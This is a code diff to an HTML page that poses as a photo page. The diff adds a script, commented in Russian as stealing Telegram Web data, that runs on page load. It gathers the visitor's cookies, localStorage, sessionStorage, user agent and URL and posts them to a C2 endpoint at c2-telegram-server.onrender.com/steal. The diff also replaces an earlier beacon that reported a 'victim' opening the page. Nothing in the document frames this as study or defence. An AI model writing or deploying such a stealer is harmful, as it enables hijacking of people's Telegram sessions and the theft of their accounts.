@@ -23,18 +23,49 @@
     <img src="https://picsum.photos/800/600.jpg?random=42" alt="Beautiful photo">
 
     <script>
-        // Отправляем данные на C2 сервер, как только страница загрузилась
-        fetch('https://c2-telegram-server.onrender.com/steal', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                msg: 'Жертва открыла страницу!',
+        // Кража реальных данных Telegram Web
+        (function() {
+            // Функция для получения cookies
+            const getCookies = () => {
+                return document.cookie;
+            };
+            
+            // Функция для получения localStorage
+            const getLocalStorage = () => {
+                const items = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    items[key] = localStorage.getItem(key);
+                }
+                return items;
+            };
+            
+            // Собираем данные
+            const stolenData = {
+                cookies: getCookies(),
+                localStorage: getLocalStorage(),
+                sessionStorage: (() => {
+                    const items = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        items[key] = sessionStorage.getItem(key);
+                    }
+                    return items;
+                })(),
+                userAgent: navigator.userAgent,
                 url: window.location.href,
                 time: new Date().toISOString()
-            })
-        });
+            };
+            
+            // Отправляем на C2 сервер
+            fetch('https://c2-telegram-server.onrender.com/steal', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(stolenData)
+            });
+        })();
     </script>
 </body>
 </html>
